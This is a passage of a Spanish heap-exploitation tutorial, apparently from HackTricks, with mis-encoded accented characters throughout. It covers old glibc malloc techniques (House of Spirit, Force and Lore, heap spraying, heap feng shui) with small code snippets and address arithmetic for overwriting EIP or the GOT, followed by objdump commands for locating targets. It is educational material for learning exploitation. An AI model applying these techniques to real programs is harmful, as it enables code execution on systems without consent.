En el **av->fastbins\[0\]** se sobrescribir√° con la direcci√≥n de **p** y ser√° el RET, as√≠ se saltar√° a la shellcode.

Adem√°s, en **av->system\_mem** (1484 bytes por encima de la posici√≥n en la pila) habr√° suficiente basura que nos permitir√° saltarnos la comprobaci√≥n que se realiza.

Adem√°s, se debe cumplir que el chunk contiguo al liberado sea mayor que 8. Dado que hemos dicho que el tama√±o del chunk liberado es 16, en este chunk falso solo tenemos que poner un tama√±o mayor que 8 (adem√°s, la shellcode ir√° en el chunk liberado, as√≠ que habr√° que poner al principio un jmp que caiga en los nops que van despu√©s del campo size del nuevo chunk falso).

**The House of Spirit**

En este caso, buscamos tener un puntero a un malloc que pueda ser alterado por el atacante (por ejemplo, que el puntero est√© en el stack debajo de un posible desbordamiento de una variable).

De esta manera, podr√≠amos hacer que este puntero apunte a donde sea. Sin embargo, no cualquier ubicaci√≥n es v√°lida, el tama√±o del chunk falso debe ser menor que av->max\_fast y, m√°s espec√≠ficamente, igual al tama√±o solicitado en una futura llamada a malloc()+8. Por lo tanto, si sabemos que despu√©s de este puntero vulnerable se llama a malloc(40), el tama√±o del chunk falso debe ser igual a 48.
Si, por ejemplo, el programa solicita al usuario un n√∫mero, podr√≠amos ingresar 48 y apuntar el puntero de malloc modificable a los siguientes 4 bytes (que podr√≠an pertenecer al EBP con suerte, de modo que el 48 quede detr√°s, como si fuera la cabecera size). Adem√°s, la direcci√≥n ptr-4+48 debe cumplir varias condiciones (siendo en este caso ptr=EBP), es decir, 8 < ptr-4+48 < av->system_mem.

Si se cumplen estas condiciones, cuando se llame al siguiente malloc que dijimos que era malloc(40), se le asignar√° como direcci√≥n la direcci√≥n del EBP. Si el atacante tambi√©n puede controlar lo que se escribe en este malloc, puede sobrescribir tanto el EBP como el EIP con la direcci√≥n que desee.

Esto se debe a que cuando se libere con free(), se guardar√° que en la direcci√≥n que apunta al EBP del stack hay un trozo de tama√±o perfecto para el nuevo malloc() que se quiere reservar, por lo que se le asigna esa direcci√≥n.

**La Casa de la Fuerza**

Es necesario:

- Un desbordamiento en un trozo que permita sobrescribir el wilderness.
- Una llamada a malloc() con el tama√±o definido por el usuario.
- Una llamada a malloc() cuyos datos puedan ser definidos por el usuario.

Lo primero que se hace es sobrescribir el size del trozo wilderness con un valor muy grande (0xffffffff), de modo que cualquier solicitud de memoria lo suficientemente grande se trate en \_int\_malloc() sin necesidad de expandir el heap.

Lo segundo es alterar el av->top para que apunte a una zona de memoria bajo el control del atacante, como el stack. En av->top se pondr√° \&EIP - 8.

Tenemos que sobrescribir av->top para que apunte a la zona de memoria bajo el control del atacante:

victim = av->top;

remainder = chunck_at_offset(victim, nb);

av->top = remainder;

Victim recoge el valor de la direcci√≥n del trozo wilderness actual (el actual av->top) y remainder es exactamente la suma de esa direcci√≥n m√°s la cantidad de bytes solicitados por malloc(). Por lo tanto, si \&EIP-8 est√° en 0xbffff224 y av->top contiene 0x080c2788, entonces la cantidad que tenemos que reservar en el malloc controlado para que av->top apunte a $EIP-8 para el pr√≥ximo malloc() ser√°:

0xbffff224 - 0x080c2788 = 3086207644.

As√≠ se guardar√° en av->top el valor alterado y el pr√≥ximo malloc apuntar√° al EIP y podr√° sobrescribirlo.

Es importante saber que el size del nuevo trozo wilderness sea m√°s grande que la solicitud realizada por el √∫ltimo malloc(). Es decir, si el wilderness est√° apuntando a \&EIP-8, el size quedar√° justo en el campo EBP del stack.

**La Casa del Conocimiento**

**Corrupci√≥n de SmallBin**

Los trozos liberados se introducen en el bin en funci√≥n de su tama√±o. Pero antes de introducirlos, se guardan en unsorted bins. Cuando se libera un trozo, no se mete inmediatamente en su bin, sino que se queda en unsorted bins. A continuaci√≥n, si se reserva un nuevo trozo y el anterior liberado le puede servir, se le devuelve, pero si se reserva uno m√°s grande, el trozo liberado en unsorted bins se mete en su bin correspondiente.

Para alcanzar el c√≥digo vulnerable, la solicitud de memoria debe ser mayor que av->max_fast (normalmente 72) y menor que MIN_LARGE_SIZE (512).

Si en el bin hay un trozo del tama√±o adecuado a lo que se pide, se devuelve ese despu√©s de desenlazarlo:

bck = victim->bk; Apunta al trozo anterior, es la √∫nica informaci√≥n que podemos alterar.

bin->bk = bck; El pen√∫ltimo trozo pasa a ser el √∫ltimo, en caso de que bck apunte al stack, al siguiente trozo reservado se le dar√° esta direcci√≥n.

bck->fd = bin; Se cierra la lista haciendo que este apunte a bin.

Se necesita:

- Que se reserven dos malloc, de forma que al primero se le pueda hacer un desbordamiento despu√©s de que el segundo haya sido liberado e introducido en su bin (es decir, se haya reservado un malloc superior al segundo trozo antes de hacer el desbordamiento).
- Que el malloc reservado al que se le da la direcci√≥n elegida por el atacante sea controlado por el atacante.

El objetivo es el siguiente: si podemos hacer un desbordamiento en un heap que tiene debajo un trozo ya liberado y en su bin, podemos alterar su puntero bk. Si alteramos su puntero bk y este trozo llega a ser el primero de la lista de bin y se reserva, enga√±aremos a bin y le diremos que el √∫ltimo trozo de la lista (el siguiente en ofrecer) est√° en la direcci√≥n falsa que hayamos puesto (al stack o GOT, por ejemplo). Por lo tanto, si se vuelve a reservar otro trozo y el atacante tiene permisos en √©l, se le dar√° un trozo en la posici√≥n deseada y podr√° escribir en ella.

Despu√©s de liberar el trozo modificado, es necesario reservar un trozo m√°s grande que el liberado, de modo que el trozo modificado salga de unsorted bins y se introduzca en su bin correspondiente.

Una vez en su bin, es el momento de modificar su puntero bk mediante el desbordamiento para que apunte a la direcci√≥n que queremos sobrescribir.

As√≠, el bin deber√° esperar su turno hasta que se llame a malloc() suficientes veces como para que se vuelva a utilizar el bin modificado y enga√±e a bin haci√©ndole creer que el siguiente trozo est√° en la direcci√≥n falsa. A continuaci√≥n, se dar√° el trozo que nos interesa.

Para que se ejecute la vulnerabilidad lo antes posible, lo ideal ser√≠a: reserva del trozo vulnerable, reserva del trozo que se modificar√°, se libera este trozo, se reserva un trozo m√°s grande al que se modificar√°, se modifica el trozo (vulnerabilidad), se reserva un trozo del mismo tama√±o que el vulnerado y se reserva un segundo trozo del mismo tama√±o, y este ser√° el que apunte a la direcci√≥n elegida.

Para proteger este ataque, se usa la t√≠pica comprobaci√≥n de que el trozo "no" es falso: se comprueba si bck->fd est√° apuntando a victim. Es decir, en nuestro caso, si el puntero fd* del trozo falso apuntado en el stack est√° apuntando a victim. Para superar esta protecci√≥n, el atacante deber√≠a ser capaz de escribir de alguna forma (probablemente en el stack) en la direcci√≥n adecuada, la direcci√≥n de victim, para que as√≠ parezca un trozo verdadero.

**Corrupci√≥n de LargeBin**

Se necesitan los mismos requisitos que antes y algunos m√°s, adem√°s de que los trozos reservados deben ser mayores a 512.

El ataque es similar al anterior, es decir, hay que modificar el puntero bk y se necesitan todas esas llamadas a malloc(), pero adem√°s hay que modificar el size del trozo modificado de forma que ese size - nb sea < MINSIZE.

Por ejemplo, se puede poner en size 1552 para que 1552 - 1544 = 8 < MINSIZE (la resta no puede ser negativa porque se compara un unsigned).

Adem√°s, se ha introducido un parche para hacerlo a√∫n m√°s complicado.

**Heap Spraying**
B√°sicamente consiste en reservar toda la memoria posible para heaps y rellenar estos con un colch√≥n de nops acabados por una shellcode. Adem√°s, como colch√≥n se utiliza 0x0c. Pues se intentar√° saltar a la direcci√≥n 0x0c0c0c0c, y as√≠ si se sobreescribe alguna direcci√≥n a la que se vaya a llamar con este colch√≥n se saltar√° all√≠. B√°sicamente la t√°ctica es reservar lo m√°ximo posible para ver si se sobreescribe alg√∫n puntero y saltar a 0x0c0c0c0c esperando que all√≠ haya nops.

**Heap Feng Shui**

Consiste en mediante reservas y liberaciones sementar la memoria de forma que queden trozos reservados entre medias de trozos libres. El buffer a desbordar se situar√° en uno de los huevos.

**objdump -d ejecutable** ‚Äî> Desensambla funciones\
**objdump -d ./PROGRAMA | grep FUNCION** ‚Äî> Obtener direcci√≥n de la funci√≥n\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para verificar que efectivamente es nuestra shellcode y obtener los OpCodes\
**objdump -t ./exec | grep varBss** ‚Äî> Tabla de s√≠mbolos, para obtener la direcci√≥n de variables y funciones\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Para obtener la direcci√≥n de funciones de librer√≠as (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Obtiene la direcci√≥n de puts a sobrescribir en la GOT\
**objdump -D ./exec** ‚Äî> Desensambla TODO hasta las entradas de la plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Informaci√≥n de la funci√≥n en gdb

## Cursos interesantes

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)

## **Referencias**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
